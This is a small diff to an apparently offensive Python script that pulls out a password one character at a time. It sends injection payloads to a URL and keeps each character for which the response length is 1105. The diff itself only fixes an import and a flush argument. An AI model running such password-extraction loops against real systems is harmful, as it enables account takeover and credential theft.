@@ -1,4 +1,3 @@
-from re import T
 import requests
 import string
 
@@ -46,6 +45,6 @@ for p in range(0,length): #loop for each character in the password
         r = requests.get(url+payload, headers=headers)
         if len(r.text) == 1105:
             password += c
-            print(c, end='', flush=T)
+            print(c, end='', flush=True)
 
     offset += '.'
